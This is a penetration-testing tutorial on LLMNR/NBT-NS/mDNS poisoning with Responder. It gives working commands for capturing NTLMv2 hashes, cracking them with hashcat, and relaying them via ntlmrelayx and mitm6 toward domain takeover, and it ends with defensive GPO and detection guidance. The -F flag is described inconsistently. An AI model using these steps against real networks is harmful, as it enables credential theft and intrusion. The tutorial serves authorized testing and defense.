---
title: "LLMNR/NBT-NS Poisoning with Responder"
description: "Capturing NTLMv2 hashes on enterprise networks by poisoning LLMNR, NBT-NS, and MDNS multicast name resolution - the protocol details, Responder configuration, hash format walk-through, cracking strategy, and SMB-signing-aware relay alternatives."
date: 2026-02-20
difficulty: Medium
tags: [responder, ntlm, llmnr, nbt-ns, hash-capture]
---

## How It Works

When a Windows machine can't resolve a hostname via DNS, it falls back to multicast protocols: LLMNR (port 5355) and NBT-NS (port 137). An attacker on the same network segment can respond to these broadcasts, claiming to be the requested host. The victim then sends its NTLMv2 authentication hash to the attacker.

This is the canonical day-1 attack on internal pentests. Within minutes of plugging into a corporate LAN, you usually have at least one NTLMv2 hash; on poorly-configured networks you'll have dozens within an hour. The reason is simple: end-users mistype share paths, scripts reference stale internal hostnames, GPO-deployed scheduled tasks reach for `\\fileserverr\install`, and every one of those is a name-resolution failure that triggers the multicast fallback.

### The Protocol Stack Beneath It

When a Windows host opens `\\filesrv01\share`, the resolver walks a deterministic order:

1. **HOSTS file** (`C:\Windows\System32\drivers\etc\hosts`).
2. **DNS** (the configured DNS server).
3. **LLMNR** (Link-Local Multicast Name Resolution, RFC 4795) - UDP/5355 multicast to `224.0.0.252` (IPv4) / `FF02::1:3` (IPv6). Any host on the link can respond claiming to be `filesrv01`.
4. **NBT-NS** (NetBIOS Name Service) - UDP/137 broadcast (legacy, but still on by default in many configurations).
5. **mDNS** (Apple Bonjour, RFC 6762) - UDP/5353 multicast to `224.0.0.251`. Sometimes enabled on hardware/printer-heavy networks.

Steps 3-5 are unauthenticated - the responder simply claims a name and the resolver believes the first reply. Once the victim "knows" your IP is `filesrv01`, it opens an SMB connection to you. Because Windows tries to authenticate to every share with the user's current credentials by default (NULL/Guest first, then the user), it sends an NTLMv2 challenge-response to *you*.

You now have an NTLMv2 hash you can either crack offline or relay onward to another host where the user has access.

## Running Responder

```bash
sudo responder -I eth0 -dwPv
```

Flags: `-d` (DHCP), `-w` (WPAD proxy), `-P` (ProxyAuth), `-v` (verbose).

### What Each Flag Buys You

| Flag | Effect |
|---|---|
| `-I eth0` | Interface to listen on. Required. |
| `-d` | Spoof DHCP responses with a malicious WPAD URL. Only useful when DHCP traffic is observable. |
| `-w` | Run a WPAD rogue proxy. Browsers / Office / Outlook configured to "Auto-detect proxy" will fetch `wpad.dat` from you, and any onward authenticated request can be challenged. Big yield. |
| `-P` | Force authentication on the WPAD proxy itself. Browsers comply silently with NTLM auth challenges from configured proxies. |
| `-v` | Verbose mode - useful for debugging missed protocols. |
| `-F` | Force NTLMv1 challenge-response if possible (much weaker than NTLMv2; crackable in 24h via [crack.sh](https://crack.sh)). |
| `-r` | Enable answers for NetBIOS workgroup queries (broader poisoning, slightly noisier). |
| `-A` | Analyze mode - observe traffic without responding (pre-engagement reconnaissance, no active spoofing). |

### Pre-Flight Setup

Before launching, edit `/etc/responder/Responder.conf`:

- Disable any service that conflicts with planned activity. If you intend to relay rather than capture, **turn off SMB and HTTP** in Responder so they don't terminate the auth, leaving them free for `ntlmrelayx`.
  ```ini
  [Responder Core]
  SMB = Off
  HTTP = Off
  HTTPS = Off
  ```
- Pre-seed the **`ResponderForceWpadAuth`** if you want browser hash captures.
- Set **`Challenge`** to a static value - speeds up cracking with rainbow tables, though most operations cracker-side use the dynamic value just fine.

### Running with `Analyze` Mode First

```bash
sudo responder -I eth0 -A
```

Listens passively, logs which clients are sending name-resolution queries, and prints unique hostnames asked for. This tells you:

- Whether LLMNR is enabled in the environment.
- Which hostnames are routinely mistyped or outdated.
- Whether your network position can see the relevant multicast (some VLAN configurations isolate broadcast domains).

After 10-15 minutes of observation, switch to active responder mode.

## Capturing Hashes

When a user mistypes a share path (`\\fileserverr\share`) or WPAD is enabled, Responder answers the multicast query and captures the NTLMv2 hash.

### What the Captured Hash Looks Like

Responder writes captured hashes to `/usr/share/responder/logs/SMB-NTLMv2-SSP-<ip>.txt` in hashcat-friendly format:

```
alice::CORP:1122334455667788:E7B70D3C8C7AAA64FCAB39E8E7F9B23B:0101000000000000C0653150DE09D2018BC0...
^^^^^^      ^^^^^^^^^^^^^^^^^^ ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
username    server challenge   NT response
            (8 bytes hex)      (16 bytes HMAC-MD5)
                                                   blob (variable, NTLMv2 blob)
```

NTLMv2 protocol details - the response is `HMAC-MD5(NTLMv2 password hash, server_challenge || blob)`. A valid crack candidate must compute the same HMAC for a guessed password.

### Yield Multipliers

If you capture only a few hashes, increase yield by:

- **WPAD spoofing** (browsers, Outlook, scheduled tasks).
- **`mitm6` IPv6 takeover** alongside Responder - Windows prefers IPv6, and `mitm6` serves itself as the IPv6 DNS resolver, so every IPv6-capable host (all of them) resolves *every name* through you. Often dwarfs Responder's yield.
  ```bash
  mitm6 -d corp.local
  ```
- **Forging a printer**: deploying as a fake print server using `responder -F` increases yield because print spooler authentication is silent.
- **Targeting Outlook/Exchange autodiscover**: `Inveigh` and modern Responder versions include autodiscover-spoofing logic that catches Exchange-style auth.

## Cracking NTLMv2

```bash
hashcat -m 5600 hashes.txt rockyou.txt -r rules/best64.rule
```

NTLMv2 is HMAC-MD5 with the user's NT hash as the key. On a single RTX 4090 you'll see ~5 GH/s, so a wordlist + rules attack on 1 billion candidate passwords takes 0.2 seconds. Brute force becomes the gating factor only at 10-character mixed passwords.

### Practical Cracking Strategy

```bash
# 1. Wordlist + best64 rules - cracks ~30% of typical corporate hashes in seconds
hashcat -m 5600 hashes.txt /opt/wordlists/rockyou.txt -r /opt/wordlists/rules/best64.rule

# 2. Wordlist + OneRuleToRuleThemAll - much more aggressive, ~70% of common passwords
hashcat -m 5600 hashes.txt /opt/wordlists/rockyou.txt -r /opt/wordlists/rules/OneRuleToRuleThemAll.rule

# 3. Custom corporate wordlist (company name + variations + common years)
hashcat -m 5600 hashes.txt /opt/wordlists/corp.txt -r /opt/wordlists/rules/d3ad0ne.rule

# 4. Mask attack for known patterns (e.g. 8-char alphanum + 2 digits)
hashcat -m 5600 hashes.txt -a 3 ?u?l?l?l?l?l?l?d?d

# 5. Pure brute force (only for short hashes worth the wait)
hashcat -m 5600 hashes.txt -a 3 ?a?a?a?a?a?a?a?a
```

Modern enterprise password policies (12-character minimum, complexity required) defeat 1-3 a fair fraction of the time; that's when targeted custom wordlists derived from the company's branding, products, and seasons become more productive than commodity rockyou.

## Relaying Instead of Cracking

If SMB signing is not required, relay the captured authentication directly to another host:

```bash
ntlmrelayx.py -tf targets.txt -smb2support
```

### Why Relay Is Often Better

Cracking takes time and may yield nothing if the password is strong. Relaying happens in real time and gives you authenticated access to whatever the relayed user has access to - without ever knowing the password.

The basic relay setup:

```bash
# 1. In Responder.conf, disable SMB and HTTP so they don't intercept
# 2. In another terminal:
ntlmrelayx.py -tf targets.txt -smb2support \
    -socks                            # SOCKS proxy for tunneling tools through relayed sessions
    -of loot/                         # output dir for collected creds
    -i                                # interactive mode for landed sessions
```

Where `targets.txt` is a list of hosts you want to relay to. Practical target selection:

- **Hosts where the captured user is local admin** - gives you remote shell, lsass dump, etc.
- **DCs over LDAP/LDAPS** (when LDAP signing isn't enforced) - leads to RBCD chain (see the `ntlm-relay-ldap` post).
- **MSSQL servers** over TCP/1433 - often have linked servers chaining further.
- **Exchange Web Services** for mail extraction.
- **ADCS Web Enrollment** (ESC8) - get DC certificates.

### SMB Signing Requirements

Relaying to SMB requires the target to **not require** SMB signing. Identify candidates with:

```bash
# crackmapexec / netexec - fast, scriptable
nxc smb 10.0.0.0/24 --gen-relay-list relay-targets.txt

# nmap NSE
nmap --script smb2-security-mode -p 445 10.0.0.0/24
# "Message signing enabled but not required" = relayable
# "Message signing enabled and required" = blocked
```

DCs always require SMB signing (since 2003 SP1). Member servers and workstations historically don't. Modern Windows 11 / Server 2025 are starting to enable SMB signing by default - but still rare in production.

## Defense

Disable LLMNR via GPO. Disable NBT-NS on all interfaces. Enforce SMB signing. Deploy network detection for Responder artifacts.

### The Concrete Configuration

| Control | How |
|---|---|
| Disable LLMNR | GPO: `Computer Configuration → Administrative Templates → Network → DNS Client → Turn off Multicast Name Resolution = Enabled` |
| Disable NBT-NS | DHCP option 001 with `Microsoft Disable NetBIOS Option = 0x2`; or per-NIC setting via PowerShell `Set-NetAdapterBinding -ComponentID 'ms_netbios' -Enabled $false` |
| Disable mDNS | Group Policy in Windows 11 / Server 2022; `Bonjour Service` removed |
| Enforce SMB signing | GPO: `Microsoft Network Client/Server: Digitally sign communications (always) = Enabled` |
| Enforce LDAP signing | DC registry: `LDAPServerIntegrity = 2`, `LdapEnforceChannelBinding = 2` |
| Block IPv6 link-local where unused | `Set-NetAdapterBinding -ComponentID ms_tcpip6 -Enabled $false` (only if no IPv6 dependency) |
| Network detection | Suricata signatures for repeated LLMNR replies from a single source; Defender for Identity rule "Suspected DCSync attack" + "NTLM relay" rules |
| `Protected Users` group | Members can't use NTLM at all - eliminates them from this attack class entirely |

### Detection Sources

- **Sysmon Event 22** (DnsQuery) on hosts that should never be querying odd internal names.
- **Suricata `et open` ruleset** has signatures for Responder's HTTP banner and characteristic timing.
- **Defender for Identity** (Azure ATP) detects coerced NTLM and NTLM-over-* relay patterns.
- **Custom rule**: any host where outbound TCP/445 NTLM auth occurs *to a workstation IP that wasn't previously seen as an SMB server*.

## Layering with Other Primitives

Responder is rarely standalone. The full first-day workflow on an internal pentest typically runs:

1. **`responder -A`** - observe 15 min, decide.
2. **`responder + mitm6`** - actively poison.
3. **`ntlmrelayx`** to dump high-value targets where signing allows.
4. **`certipy find`** for ADCS findings (often relayable to ESC8).
5. **`bloodhound-python`** with any creds gained for path discovery.
6. **PetitPotam coercion** to escalate captured/relayed sessions to DC takeover.

Each step opens additional avenues; the captured NTLMv2 hashes from step 2 fuel the cracking effort that runs in parallel through the rest of the engagement.

> Responder is often the first tool run during an internal pentest. If LLMNR isn't disabled, you will capture hashes within minutes - and increasingly often, you don't even need to crack them, just relay them onward and watch the privilege escalation cascade.
